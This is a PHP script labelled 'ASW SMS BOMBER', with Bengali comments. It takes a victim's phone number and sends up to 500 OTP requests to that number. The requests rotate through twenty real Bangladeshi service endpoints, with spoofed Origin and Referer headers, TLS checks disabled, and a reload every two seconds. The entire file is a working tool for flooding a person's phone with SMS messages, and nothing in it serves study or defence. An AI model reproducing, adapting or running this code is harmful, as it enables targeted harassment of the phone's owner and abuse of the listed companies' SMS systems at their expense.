<?php
error_reporting(0);
$phone = $_GET['phone'] ?? '';
$current_hit = isset($_GET['hit']) ? (int)$_GET['hit'] : 1;
$total_target = 500;

if(!$phone) die("Phone number missing! Use ?phone=01XXXXXXXXX");

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    

// এপিআই মাস্টার লিস্ট (সবগুলো সার্ভিস এখানে)
$base_apis = [
    ["name"=>"RedX", "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11], "origin"=>"https://redx.com.bd"],
    ["name"=>"Ali2BD", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11], "origin"=>"https://ali2bd.com"],
    ["name"=>"Hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST", "origin"=>"https://web.hishabee.business"],
    ["name"=>"Bikroy", "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", "method"=>"GET", "origin"=>"https://bikroy.com"],
    ["name"=>"Chardike", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"], "origin"=>"https://chardike.com"],
    ["name"=>"Bohubrihi", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"], "origin"=>"https://bohubrihi.com"],
    ["name"=>"Rokomari", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET", "origin"=>"https://www.rokomari.com"],
    ["name"=>"Airtel", "url"=>"https://api.bd.airtel.com/v1/account/login/otp", "method"=>"POST", "data"=>["phone_number"=>$phone_11], "origin"=>"https://www.bd.airtel.com"],
    ["name"=>"Ostad", "url"=>"https://api.ostad.app/api/v2/user/with-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11], "origin"=>"https://ostad.app"],
    ["name"=>"Ghoori", "url"=>"https://api.ghoorilearning.com/api/auth/signup/otp", "method"=>"POST", "data"=>["mobile_no"=>$phone_11], "origin"=>"https://ghoorilearning.com"],
    ["name"=>"RabbitHole", "url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method"=>"POST", "data"=>["mobile"=>"+88".$phone_11], "origin"=>"https://www.rabbitholebd.com"],
    ["name"=>"Shomvob", "url"=>"https://backend-api.shomvob.co/api/v2/otp/phone", "method"=>"POST", "data"=>["phone"=>$phone_88], "origin"=>"https://shomvob.co"],
    ["name"=>"Shadhin", "url"=>"https://connect.shadhinmusic.com/v1/api//otp/send", "method"=>"POST", "data"=>["msisdn"=>$phone_88], "origin"=>"https://shadhinmusic.com"],
    ["name"=>"Swap", "url"=>"https://api.swap.com.bd/api/v1/send-otp/v2", "method"=>"POST", "data"=>["phone"=>$deepto_number], "origin"=>"https://swap.com.bd"],
    ["name"=>"OsudPotro", "url"=>"https://api.osudpotro.com/api/v1/users/send_otp", "method"=>"POST", "data"=>["mobile"=>$phone_osudpotro], "origin"=>"https://osudpotro.com"],
    ["name"=>"Deepto", "url"=>"https://api.deeptoplay.com/v2/auth/login?platform=web", "method"=>"POST", "data"=>["number"=>$deepto_number], "origin"=>"https://www.deeptoplay.com"],
    ["name"=>"PBS", "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP", "method"=>"POST", "data"=>["userPhone"=>$phone_11], "origin"=>"https://pbs.com.bd"],
    ["name"=>"Shikho", "url"=>"https://api.shikho.com/auth/v2/send/sms", "method"=>"POST", "data"=>["phone"=>$phone_88, "type"=>"student"], "origin"=>"https://shikho.com"],
    ["name"=>"Apex", "url"=>"https://api.apex4u.com/api/auth/login", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11], "origin"=>"https://apex4u.com"],
    ["name"=>"GP", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11], "origin"=>"https://weblogin.grameenphone.com"]
];

// বর্তমান এপিআই সিলেক্ট করা
$api = $base_apis[$current_hit % count($base_apis)];

// চলো হিট করি!
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $api['url']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 15);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$headers = [
    'Content-Type: application/json',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Referer: ' . ($api['origin'] ?? 'https://google.com'),
    'Origin: ' . ($api['origin'] ?? 'https://google.com')
];
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

if (($api['method'] ?? 'POST') === "POST") {
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
}

$response = curl_exec($ch);
curl_close($ch);

// ডিসপ্লে রেজাল্ট
echo "<html><body style='background:#000; color:#0f0; font-family:monospace; text-align:center;'>";
echo "<h2>ASW SMS BOMBER</h2>";
echo "<div style='border:1px solid #0f0; padding:20px; display:inline-block;'>";
echo "Target: $phone<br>";
echo "Current Hit: <b>$current_hit</b> / $total_target<br>";
echo "API Used: " . $api['name'] . "<br>";
echo "Status: Sent Successfully!<br>";
echo "</div>";

// অটো-রিলোড লজিক (৫০০ না হওয়া পর্যন্ত চলবে)
if ($current_hit < $total_target) {
    $next_hit = $current_hit + 1;
    $next_url = "?phone=$phone&hit=$next_hit";
    
    echo "<p>Next hit in 2 seconds...</p>";
    // জাভাস্ক্রিপ্ট রিডাইরেক্ট (সবচেয়ে সেফ মেথড)
    echo "<script>
        setTimeout(function(){
            window.location.href = '$next_url';
        }, 2000);
    </script>";
} else {
    echo "<h2>DONE! 500 REQUESTS COMPLETED.</h2>";
}
echo "</body></html>";
